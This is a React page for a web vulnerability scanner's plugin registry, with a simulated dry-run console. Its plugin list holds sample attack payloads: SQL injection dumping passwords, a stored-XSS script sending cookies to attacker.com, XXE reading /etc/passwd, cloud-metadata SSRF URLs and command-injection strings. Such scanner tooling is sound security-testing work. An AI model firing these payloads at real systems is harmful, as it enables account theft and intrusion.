"use client";
import { useState } from "react";
import { Zap, Filter, Play, CheckCircle, Code, Settings, Terminal, ShieldAlert, Cpu, ToggleLeft, ToggleRight } from "lucide-react";

type PluginCategory = "Injection" | "Auth" | "Authorization" | "Client-Side" | "Server-Side" | "API" | "Configuration" | "Logic";
type PluginStatus = "enabled" | "disabled" | "running" | "done";

interface Plugin {
  id:          string;
  name:        string;
  category:    PluginCategory;
  severity:    string;
  cwe:         string;
  owasp:       string;
  status:      PluginStatus;
  confidence:  "Verified" | "High" | "Medium";
  payloads:    number;
  findings:    number;
  input:       string;
  logic:       string;
  output:      string;
  applies:     string[];
  samplePayloads?: string[];
}

const PLUGINS: Plugin[] = [
  { 
    id:"sqli",    
    name:"SQL Injection",               
    category:"Injection",      
    severity:"Critical", 
    cwe:"CWE-89",  
    owasp:"A03",  
    status:"done",    
    confidence:"Verified", 
    payloads:48, 
    findings:1, 
    input:"Request + baseline response", 
    logic:"Inject UNION/Boolean/Time/Error payloads. Compare response size, timing, error content.", 
    output:"Finding + SQL error evidence + reproduction", 
    applies:["query","body-json","body-form","path"],
    samplePayloads: [
      "' OR 1=1--",
      "1' UNION SELECT null, username, password FROM users--",
      "'; WAITFOR DELAY '0:0:5'--",
      "admin' AND 1=2--"
    ]
  },
  { 
    id:"xss-r",   
    name:"XSS (Reflected)",             
    category:"Client-Side",    
    severity:"High",     
    cwe:"CWE-79",  
    owasp:"A03",  
    status:"done",    
    confidence:"Verified", 
    payloads:32, 
    findings:0, 
    input:"Request + baseline response", 
    logic:"Inject script payloads — check if reflected unescaped in response body.", 
    output:"Finding + payload reflected in response",      
    applies:["query","body-json","body-form"],
    samplePayloads: [
      "<script>alert(document.cookie)</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      "'\"><svg/onload=alert(1)>"
    ]
  },
  { 
    id:"xss-s",   
    name:"XSS (Stored)",                
    category:"Client-Side",    
    severity:"Critical", 
    cwe:"CWE-79",  
    owasp:"A03",  
    status:"done",    
    confidence:"Verified", 
    payloads:12, 
    findings:1, 
    input:"Write endpoint → Read endpoint", 
    logic:"Inject payload on write. Fetch read endpoint, check if payload persists unescaped.", 
    output:"Finding + payload stored + rendered",         
    applies:["body-json","body-form"],
    samplePayloads: [
      "<script>fetch('http://attacker.com/c?='+document.cookie)</script>",
      "<svg/onload=confirm(1)>"
    ]
  },
  { 
    id:"xss-d",   
    name:"XSS (DOM-Based)",             
    category:"Client-Side",    
    severity:"High",     
    cwe:"CWE-79",  
    owasp:"A03",  
    status:"done",    
    confidence:"High",     
    payloads:18, 
    findings:0, 
    input:"Browser + JS source", 
    logic:"Playwright injects DOM sinks — track document.write, innerHTML, location.hash execution.", 
    output:"Finding + DOM sink location",                 
    applies:["query","fragment"],
    samplePayloads: [
      "#jaVasCript:alert(1)",
      "?name=<iframe src=javascript:alert(1)>"
    ]
  },
  { 
    id:"ssrf",    
    name:"SSRF",                        
    category:"Server-Side",    
    severity:"Critical", 
    cwe:"CWE-918", 
    owasp:"A10",  
    status:"done",    
    confidence:"Verified", 
    payloads:20, 
    findings:1, 
    input:"URL parameter + OOB server", 
    logic:"Inject OOB callback URL. Monitor for DNS/HTTP interaction at OOB server.", 
    output:"Finding + OOB callback evidence",              
    applies:["body-json","query","header"],
    samplePayloads: [
      "http://169.254.169.254/latest/meta-data/",
      "http://localhost:22",
      "http://oob-sentinel.axiom.com/c?id=ssrf"
    ]
  },
  { 
    id:"xxe",     
    name:"XML External Entity (XXE)",   
    category:"Injection",      
    severity:"Critical", 
    cwe:"CWE-611", 
    owasp:"A05",  
    status:"done",    
    confidence:"Verified", 
    payloads:8,  
    findings:0, 
    input:"XML body + OOB server", 
    logic:"Inject ENTITY declaration referencing OOB server. Check for callback.", 
    output:"Finding + OOB XXE callback",                  
    applies:["body-xml","multipart"],
    samplePayloads: [
      "<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>",
      "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"
    ]
  },
  { 
    id:"ssti",    
    name:"Server-Side Template Injection",
    category:"Injection",    
    severity:"Critical", 
    cwe:"CWE-94",  
    owasp:"A03",  
    status:"done",    
    confidence:"High",     
    payloads:24, 
    findings:0, 
    input:"String parameter + baseline", 
    logic:"Inject template expressions {{7*7}}, #{7*7}, ${7*7}. Check 49 in response.", 
    output:"Finding + expression evaluated",              
    applies:["query","body-json","body-form"],
    samplePayloads: [
      "${7*7}",
      "{{7*7}}",
      "<%= 7*7 %>",
      "#{7*7}"
    ]
  },
  { 
    id:"cmdi",    
    name:"Command Injection",            
    category:"Injection",      
    severity:"Critical", 
    cwe:"CWE-78",  
    owasp:"A03",  
    status:"done",    
    confidence:"Verified", 
    payloads:16, 
    findings:0, 
    input:"OS command parameter + OOB", 
    logic:"Inject ; sleep 5, |nslookup oob. Detect timing and OOB callback.", 
    output:"Finding + OOB CMDi callback",                 
    applies:["query","body-json","body-form"],
    samplePayloads: [
      "; id; whoami",
      "| nslookup cmd.axiom.com",
      "&& sleep 10",
      "`id`"
    ]
  },
  { 
    id:"lfi",     
    name:"Path Traversal / LFI",        
    category:"Server-Side",    
    severity:"High",     
    cwe:"CWE-22",  
    owasp:"A01",  
    status:"done",    
    confidence:"Verified", 
    payloads:20, 
    findings:1, 
    input:"File/path parameter + baseline", 
    logic:"Inject ../../etc/passwd, ....// sequences. Check for file content in response.", 
    output:"Finding + file content in response",          
    applies:["query","path","header"],
    samplePayloads: [
      "../../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "....//....//etc/passwd"
    ]
  },
  { 
    id:"idor",    
    name:"BOLA / IDOR",                 
    category:"Authorization",  
    severity:"High",     
    cwe:"CWE-639", 
    owasp:"A01",  
    status:"done",    
    confidence:"Verified", 
    payloads:12, 
    findings:2, 
    input:"Resource ID parameter + auth token", 
    logic:"Enumerate IDs with different user tokens. Check for cross-user data access.", 
    output:"Finding + unauthorized resource response",    
    applies:["path","query","body-json"],
    samplePayloads: [
      "GET /api/users/1",
      "PUT /api/profile/update?id=1"
    ]
  },
  { 
    id:"csrf",    
    name:"CSRF",                        
    category:"Client-Side",    
    severity:"Medium",   
    cwe:"CWE-352", 
    owasp:"A01",  
    status:"done",    
    confidence:"High",     
    payloads:6,  
    findings:0, 
    input:"State-changing request + CSRF check", 
    logic:"Check for CSRF token in state-changing requests. Test token absence/replay.", 
    output:"Finding + missing CSRF token evidence",       
    applies:["body-form","body-json"]
  },
  { 
    id:"jwt",     
    name:"JWT Security",                
    category:"Auth",           
    severity:"High",     
    cwe:"CWE-347", 
    owasp:"A02",  
    status:"done",    
    confidence:"Verified", 
    payloads:8,  
    findings:1, 
    input:"JWT token + auth endpoints", 
    logic:"Test alg:none, HS256 key confusion, empty signature, expired tokens.", 
    output:"Finding + forged token accepted",              
    applies:["header","cookie"],
    samplePayloads: [
      "alg: none header swap",
      "HS256 secret key bruteforce"
    ]
  },
  { 
    id:"cors",    
    name:"CORS Misconfiguration",       
    category:"Configuration",  
    severity:"High",     
    cwe:"CWE-346", 
    owasp:"A05",  
    status:"done",    
    confidence:"Verified", 
    payloads:10, 
    findings:1, 
    input:"Cross-origin request + baseline", 
    logic:"Test arbitrary origin, null origin reflection, credentials=true with reflection.", 
    output:"Finding + reflected Access-Control-Allow-Origin",
    applies:["header"],
    samplePayloads: [
      "Origin: http://evil-attacker.com",
      "Origin: null"
    ]
  },
  { 
    id:"headers", 
    name:"Security Headers",            
    category:"Configuration",  
    severity:"Medium",   
    cwe:"CWE-16",  
    owasp:"A05",  
    status:"done",    
    confidence:"Verified", 
    payloads:0,  
    findings:1, 
    input:"HTTP response baseline", 
    logic:"Check for missing/misconfigured CSP, HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy.", 
    output:"Finding per missing/weak header",              
    applies:["header"]
  },
  { 
    id:"auth",    
    name:"Authentication Weakness",     
    category:"Auth",           
    severity:"High",     
    cwe:"CWE-287", 
    owasp:"A02",  
    status:"done",    
    confidence:"High",     
    payloads:14, 
    findings:0, 
    input:"Auth endpoint + credential list", 
    logic:"Test credential stuffing, weak passwords, lockout bypass, username enumeration.", 
    output:"Finding + auth bypass evidence",               
    applies:["body-json","body-form"]
  },
  { 
    id:"oauth",   
    name:"OAuth / OIDC Security",       
    category:"Auth",           
    severity:"High",     
    cwe:"CWE-601", 
    owasp:"A02",  
    status:"done",    
    confidence:"High",     
    payloads:8,  
    findings:0, 
    input:"OAuth flow + state parameter", 
    logic:"Test state parameter bypass, token leak via redirect, implicit flow abuse.", 
    output:"Finding + state bypass evidence",              
    applies:["query","header"]
  },
  { 
    id:"redirect",
    name:"Open Redirect",               
    category:"Server-Side",    
    severity:"Medium",   
    cwe:"CWE-601", 
    owasp:"A03",  
    status:"done",    
    confidence:"Verified", 
    payloads:12, 
    findings:0, 
    input:"Redirect parameter + baseline", 
    logic:"Inject external URL into redirect parameter. Check if response Location header reflects it.", 
    output:"Finding + Location header evidence",           
    applies:["query","body-json"],
    samplePayloads: [
      "//evil-attacker.com",
      "https:evil-attacker.com"
    ]
  },
  { 
    id:"mass",    
    name:"Mass Assignment",             
    category:"Logic",          
    severity:"High",     
    cwe:"CWE-915", 
    owasp:"A03",  
    status:"done",    
    confidence:"High",     
    payloads:6,  
    findings:1, 
    input:"Update endpoint + privilege fields", 
    logic:"Inject privileged fields (role, isAdmin) into body. Check if server accepts them.", 
    output:"Finding + accepted privilege field in response",
    applies:["body-json","body-form"],
    samplePayloads: [
      "{\"isAdmin\": true}",
      "{\"role\": \"administrator\"}"
    ]
  },
  { 
    id:"ratelimit",
    name:"Rate Limiting",              
    category:"Logic",          
    severity:"Medium",   
    cwe:"CWE-770", 
    owasp:"A04",  
    status:"done",    
    confidence:"Verified", 
    payloads:0,  
    findings:0, 
    input:"Auth/sensitive endpoint + flood test", 
    logic:"Send 100 requests in 10s. Check for 429 response or lack thereof.", 
    output:"Finding + successful request flood evidence",  
    applies:["query","body-json"]
  },
  { 
    id:"upload",  
    name:"File Upload Security",        
    category:"Server-Side",    
    severity:"High",     
    cwe:"CWE-434", 
    owasp:"A04",  
    status:"disabled",
    confidence:"High",     
    payloads:12, 
    findings:0, 
    input:"Upload endpoint + file types", 
    logic:"Upload PHP/JSP/SVG/polyglot files. Check for execution or reflection.", 
    output:"Finding + malicious file accepted/executed",   
    applies:["multipart"],
    samplePayloads: [
      "shell.php.png",
      "exploit.svg (with embedded XSS script)"
    ]
  },
  { 
    id:"ws",      
    name:"WebSocket Security",          
    category:"API",            
    severity:"Medium",   
    cwe:"CWE-116", 
    owasp:"A08",  
    status:"disabled",
    confidence:"Medium",   
    payloads:8,  
    findings:0, 
    input:"WS connection + messages", 
    logic:"Inject XSS/SQLi payloads into WS frames. Test auth enforcement on WS upgrade.", 
    output:"Finding + vulnerable WS message evidence",     
    applies:["websocket"]
  },
  { 
    id:"graphql", 
    name:"GraphQL Security",            
    category:"API",            
    severity:"High",     
    cwe:"CWE-285", 
    owasp:"A01",  
    status:"done",    
    confidence:"High",     
    payloads:10, 
    findings:0, 
    input:"GraphQL endpoint + introspection", 
    logic:"Enable introspection, test batching attacks, field-level authorization, injection via args.", 
    output:"Finding + introspection schema or auth bypass", 
    applies:["body-json"]
  },
  { 
    id:"proto",   
    name:"Prototype Pollution",         
    category:"Client-Side",    
    severity:"High",     
    cwe:"CWE-1321",
    owasp:"A08",  
    status:"disabled",
    confidence:"Medium",   
    payloads:8,  
    findings:0, 
    input:"JSON body + prototype keys", 
    logic:"Inject __proto__, constructor.prototype keys. Check for pollution evidence in response.", 
    output:"Finding + prototype key reflected/accepted",    
    applies:["body-json","query"]
  },
  { 
    id:"tls",     
    name:"TLS / SSL Security",          
    category:"Configuration",  
    severity:"Medium",   
    cwe:"CWE-326", 
    owasp:"A02",  
    status:"done",    
    confidence:"Verified", 
    payloads:0,  
    findings:0, 
    input:"TLS handshake + certificate", 
    logic:"Check TLS version (min TLS 1.2), cipher strength, cert expiry, HSTS preloading.", 
    output:"Finding per weak TLS configuration",           
    applies:["header"]
  },
];

const catColor: Record<PluginCategory, string> = { Injection:"#ef5350", Auth:"#ce93d8", Authorization:"var(--yellow)", "Client-Side":"#4fc3f7", "Server-Side":"#ffb74d", API:"var(--primary)", Configuration:"#a5d6a7", Logic:"var(--muted)" };
const statusColor = (s: PluginStatus) => s === "enabled" ? "var(--green)" : s === "running" ? "var(--primary)" : s === "done" ? "#a5d6a7" : "var(--muted)";
const sevColor2   = (s: string) => s === "Critical" ? "#ef5350" : s === "High" ? "#ffb74d" : s === "Medium" ? "var(--yellow)" : "var(--muted)";

export default function ScannerPage() {
  const [selected, setSelected] = useState<Plugin | null>(PLUGINS[0]);
  const [catFilter, setCatFilter] = useState("All");
  const [showDisabled, setShowDisabled] = useState(true);

  // Playground simulation console states
  const [targetUrl, setTargetUrl] = useState("http://192.168.195.140");
  const [simRunning, setSimRunning] = useState(false);
  const [simLogs, setSimLogs] = useState<string[]>([]);
  const [pluginActive, setPluginActive] = useState<Record<string, boolean>>(() => {
    const initial: Record<string, boolean> = {};
    PLUGINS.forEach(p => {
      initial[p.id] = p.status !== "disabled";
    });
    return initial;
  });
  const [sensitivity, setSensitivity] = useState<Record<string, "Conservative" | "Normal" | "Aggressive">>(() => {
    const initial: Record<string, any> = {};
    PLUGINS.forEach(p => {
      initial[p.id] = "Normal";
    });
    return initial;
  });

  const categories = ["All", ...new Set(PLUGINS.map(p => p.category))];
  const visible = PLUGINS.filter(p =>
    (catFilter === "All" || p.category === catFilter) &&
    (showDisabled || pluginActive[p.id])
  );
  const activeCount = Object.values(pluginActive).filter(Boolean).length;
  const totalFindings = PLUGINS.reduce((a, p) => a + p.findings, 0);

  // Run dry test simulation log sequence
  const startSimulation = async () => {
    if (!selected) return;
    setSimRunning(true);
    setSimLogs([]);

    const steps = [
      `[baseline] Capturing baseline state for target ${targetUrl}...`,
      `[baseline] Status: 200 OK · Data length: 482B · Latency: 42ms`,
      `[fuzz] Resolving mutation schema. Compiling ${selected.payloads > 0 ? selected.payloads : 4} payload patterns...`,
      `[fuzz] Injecting fuzzer candidates into endpoints...`,
      ...(selected.samplePayloads || ["' OR 1=1 --", "<script>alert(1)</script>"]).map(payload => 
        `[test] Firing payload: "${payload}"`
      ),
      `[analyst] Performing response diff logic check...`,
      selected.findings > 0 
        ? `[!] SIGNAL DETECTED: Discovered structural logic deviation in response. Confirming vulnerability verdict...`
        : `[info] No anomalous server response observed. Check verified safely.`,
      `[verdict] Plugin execution completed. Findings catalogued: ${selected.findings}`
    ];

    for (const step of steps) {
      await new Promise(r => setTimeout(r, 450));
      setSimLogs(prev => [...prev, step]);
    }
    setSimRunning(false);
  };

  return (
    <div style={{ height: "100%", display: "flex", flexDirection: "column", overflow: "hidden" }}>
      
      {/* Header bar */}
      <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "6px 12px", background: "var(--surface)", borderBottom: "1px solid var(--border)", flexShrink: 0, flexWrap: "wrap" }}>
        <Zap size={13} color="var(--primary)" />
        <span style={{ fontSize: 12, fontWeight: 600, color: "var(--fg)" }}>Plugin Registry</span>
        <span style={{ fontSize: 11, color: "var(--green)" }}>{activeCount} active</span>
        <span style={{ color: "var(--muted)", fontSize: 11 }}>·</span>
        <span style={{ fontSize: 11, color: "var(--muted)" }}>{PLUGINS.length - activeCount} disabled</span>
        <span style={{ color: "var(--muted)", fontSize: 11 }}>·</span>
        <span style={{ fontSize: 11, color: "#ef5350" }}>{totalFindings} findings</span>
        <Filter size={11} color="var(--muted)" style={{ marginLeft: 8 }} />
        {categories.map(c => (
          <button key={c} onClick={() => setCatFilter(c)} className="btn-secondary"
            style={catFilter === c ? { borderColor: catColor[c as PluginCategory] ?? "var(--primary)", color: catColor[c as PluginCategory] ?? "var(--primary)", fontSize: 10, padding: "2px 7px" } : { fontSize: 10, padding: "2px 7px" }}>
            {c}
          </button>
        ))}
        <label style={{ display: "flex", alignItems: "center", gap: 4, fontSize: 11, color: "var(--muted)", cursor: "pointer", marginLeft: 4 }}>
          <input type="checkbox" checked={showDisabled} onChange={e => setShowDisabled(e.target.checked)} style={{ accentColor: "var(--primary)" }} />
          Show disabled
        </label>
      </div>

      <div className="split-h" style={{ flex: 1, overflow: "hidden" }}>
        
        {/* Plugin table */}
        <div style={{ flex: 1, borderRight: selected ? "1px solid var(--border)" : "none", overflowY: "auto" }}>
          <table className="data-table">
            <thead>
              <tr>
                <th style={{ width: 28 }} />
                <th>Plugin</th>
                <th style={{ width: 110 }}>Category</th>
                <th style={{ width: 70 }}>Severity</th>
                <th style={{ width: 55 }}>CWE</th>
                <th style={{ width: 50 }}>OWASP</th>
                <th style={{ width: 65 }}>Payloads</th>
                <th style={{ width: 60 }}>Findings</th>
                <th style={{ width: 80 }}>Status</th>
              </tr>
            </thead>
            <tbody>
              {visible.map(p => {
                const isActive = pluginActive[p.id];
                return (
                  <tr key={p.id} onClick={() => setSelected(p)}
                    style={{ cursor: "pointer", opacity: !isActive ? 0.45 : 1, background: selected?.id === p.id ? "rgba(232,145,45,0.05)" : "transparent" }}>
                    <td>
                      <div style={{ width: 8, height: 8, borderRadius: "50%", background: isActive ? "var(--green)" : "var(--muted)", margin: "auto" }} />
                    </td>
                    <td style={{ fontWeight: 600, color: "var(--fg)" }}>{p.name}</td>
                    <td><span style={{ fontSize: 9.5, fontWeight: 700, color: catColor[p.category], background: `${catColor[p.category]}12`, padding: "1px 6px", borderRadius: 8 }}>{p.category}</span></td>
                    <td style={{ color: sevColor2(p.severity), fontWeight: 700, fontSize: 11 }}>{p.severity}</td>
                    <td style={{ fontFamily: "monospace", fontSize: 10.5, color: "var(--muted)" }}>{p.cwe}</td>
                    <td style={{ fontFamily: "monospace", fontSize: 11, color: "var(--primary)" }}>{p.owasp}</td>
                    <td style={{ textAlign: "center", color: "var(--muted)", fontSize: 11 }}>{p.payloads > 0 ? p.payloads : "—"}</td>
                    <td style={{ textAlign: "center" }}>
                      {p.findings > 0 ? <span style={{ color: "#ef5350", fontWeight: 700, fontSize: 11 }}>{p.findings}</span> : <span style={{ color: "var(--muted)" }}>—</span>}
                    </td>
                    <td style={{ fontSize: 10, color: isActive ? "var(--green)" : "var(--muted)" }}>
                      {isActive ? "Active" : "Disabled"}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        {/* Plugin detail (Expanded panel for maximum intelligibility) */}
        {selected && (
          <div style={{ width: 440, flexShrink: 0, overflowY: "auto", display: "flex", flexDirection: "column", background: "var(--bg)", borderLeft: "1px solid var(--border)" }}>
            
            {/* Header info */}
            <div style={{ padding: "12px 16px", background: "var(--surface)", borderBottom: "1px solid var(--border)", flexShrink: 0 }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 }}>
                <span style={{ fontSize: 14, fontWeight: 800, color: "#fff" }}>{selected.name}</span>
                {/* Active switch */}
                <button
                  style={{ background: "none", border: "none", cursor: "pointer", display: "flex", alignItems: "center" }}
                  onClick={() => setPluginActive(prev => ({ ...prev, [selected.id]: !prev[selected.id] }))}
                >
                  {pluginActive[selected.id] 
                    ? <ToggleRight size={22} color="var(--green)" /> 
                    : <ToggleLeft size={22} color="var(--muted)" />}
                </button>
              </div>
              <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                <span style={{ fontSize: 9.5, fontWeight: 700, color: catColor[selected.category], background: `${catColor[selected.category]}12`, padding: "1px 6px", borderRadius: 8 }}>{selected.category}</span>
                <span style={{ fontSize: 9.5, fontWeight: 700, color: sevColor2(selected.severity) }}>{selected.severity}</span>
                <span style={{ fontSize: 9.5, color: "var(--muted)", fontFamily: "monospace" }}>{selected.cwe}</span>
                <span style={{ fontSize: 9.5, color: "var(--primary)", fontFamily: "monospace" }}>OWASP {selected.owasp}</span>
              </div>
            </div>

            {/* Config & Info scroll zone */}
            <div style={{ flex: 1, padding: "14px 16px", display: "flex", flexDirection: "column", gap: 16 }}>
              
              {/* Stat Boxes */}
              <div style={{ display: "flex", gap: 8 }}>
                <div style={{ flex: 1, background: "var(--surface)", borderRadius: 6, border: "1px solid var(--border)", padding: "8px 10px", textAlign: "center" }}>
                  <div style={{ fontSize: 18, fontWeight: 800, color: "var(--primary)" }}>{selected.payloads}</div>
                  <div style={{ fontSize: 10, color: "var(--muted)" }}>Payload Vectors</div>
                </div>
                <div style={{ flex: 1, background: "var(--surface)", borderRadius: 6, border: "1px solid var(--border)", padding: "8px 10px", textAlign: "center" }}>
                  <div style={{ fontSize: 18, fontWeight: 800, color: selected.findings > 0 ? "#ef5350" : "var(--green)" }}>{selected.findings}</div>
                  <div style={{ fontSize: 10, color: "var(--muted)" }}>Live Findings</div>
                </div>
                <div style={{ flex: 1, background: "var(--surface)", borderRadius: 6, border: "1px solid var(--border)", padding: "8px 10px", textAlign: "center" }}>
                  <div style={{ fontSize: 13, fontWeight: 700, color: selected.confidence === "Verified" ? "var(--green)" : "var(--yellow)", marginTop: 4 }}>{selected.confidence}</div>
                  <div style={{ fontSize: 10, color: "var(--muted)" }}>Verdict Confidence</div>
                </div>
              </div>

              {/* Tweak settings */}
              <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 12, display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{ fontSize: 10, fontWeight: 700, color: "var(--primary)", textTransform: "uppercase", display: "flex", alignItems: "center", gap: 4 }}>
                  <Settings size={12} /> Execution Settings
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11 }}>
                  <span style={{ color: "var(--muted)" }}>Sensitivity:</span>
                  <div style={{ display: "flex", gap: 4 }}>
                    {(["Conservative", "Normal", "Aggressive"] as const).map(s => (
                      <button key={s} 
                        onClick={() => setSensitivity(prev => ({ ...prev, [selected.id]: s }))}
                        className="btn-secondary"
                        style={{ fontSize: 9.5, padding: "2px 6px", borderColor: sensitivity[selected.id] === s ? "var(--primary)" : "var(--border)", color: sensitivity[selected.id] === s ? "var(--primary)" : "var(--muted)" }}>
                        {s}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              {/* Input / Logic / Output details */}
              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                {[
                  { label:"Input Context",      content:selected.input,  color:"#4fc3f7" },
                  { label:"Detection Logic",    content:selected.logic,  color:"var(--yellow)" },
                  { label:"Diagnostic Output",  content:selected.output, color:"#a5d6a7" },
                ].map(s => (
                  <div key={s.label}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: s.color, textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 4 }}>{s.label}</div>
                    <p style={{ fontSize: 11.5, color: "var(--muted)", lineHeight: 1.7, background: "var(--surface)", padding: "8px 12px", borderRadius: 6, border: "1px solid var(--border)" }}>{s.content}</p>
                  </div>
                ))}
              </div>

              {/* Applies To */}
              <div>
                <div style={{ fontSize: 10, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 5 }}>Injection Vectors</div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 4 }}>
                  {selected.applies.map(a => (
                    <span key={a} style={{ fontSize: 10, color: "var(--primary)", background: "rgba(232,145,45,0.08)", border: "1px solid rgba(232,145,45,0.15)", padding: "3px 8px", borderRadius: 6, fontFamily: "monospace" }}>{a}</span>
                  ))}
                </div>
              </div>

              {/* Sample Payloads List */}
              {selected.samplePayloads && selected.samplePayloads.length > 0 && (
                <div>
                  <div style={{ fontSize: 10, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 6 }}>
                    Mutation Pattern Samples
                  </div>
                  <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
                    {selected.samplePayloads.map((payload, idx) => (
                      <pre key={idx} style={{ margin: 0, background: "#0c0f16", border: "1px solid var(--border)", borderRadius: 6, padding: "6px 10px", fontFamily: "monospace", fontSize: 10.5, color: "#ffb74d", wordBreak: "break-all", whiteSpace: "pre-wrap" }}>
                        {payload}
                      </pre>
                    ))}
                  </div>
                </div>
              )}

              {/* Interactive Fuzzer Simulator */}
              <div style={{ background: "rgba(167,139,250,0.04)", border: "1px solid rgba(167,139,250,0.18)", borderRadius: 8, padding: 12, display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ fontSize: 10, fontWeight: 700, color: "#a78bfa", textTransform: "uppercase", display: "flex", alignItems: "center", gap: 4 }}>
                    <Terminal size={12} /> Dry Run Simulator
                  </div>
                  <button className="btn-primary" style={{ fontSize: 10, padding: "3px 10px", background: "rgba(167,139,250,0.12)", border: "1px solid rgba(167,139,250,0.3)", color: "#a78bfa" }}
                    onClick={startSimulation} disabled={simRunning}>
                    {simRunning ? "Simulating..." : "Simulate Check"}
                  </button>
                </div>
                
                <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
                  <span style={{ fontSize: 10, color: "var(--muted)", minWidth: 60 }}>Target:</span>
                  <input className="tool-input" value={targetUrl} onChange={e => setTargetUrl(e.target.value)} style={{ flex: 1, padding: "3px 6px", fontSize: 10.5 }} />
                </div>

                <div style={{ background: "#080b11", border: "1px solid var(--border)", borderRadius: 6, padding: "8px 10px", minHeight: 100, maxHeight: 150, overflowY: "auto", fontFamily: "monospace", fontSize: 10.5, lineHeight: 1.5 }}>
                  {simLogs.length === 0 && (
                    <div style={{ color: "var(--muted)", fontStyle: "italic", textAlign: "center", padding: 20 }}>
                      Click "Simulate Check" to trace execution path live
                    </div>
                  )}
                  {simLogs.map((log, idx) => (
                    <div key={idx} style={{ 
                      color: log.includes("[!]") ? "#ef5350" : log.includes("[verdict]") ? "var(--green)" : log.includes("[test]") ? "#ffb74d" : "var(--muted)",
                      marginBottom: 2 
                    }}>
                      {log}
                    </div>
                  ))}
                  {simRunning && <div style={{ color: "var(--primary)", display: "inline-block", animation: "pulse 1s infinite" }}>█</div>}
                </div>
              </div>

            </div>
          </div>
        )}
      </div>
    </div>
  );
}
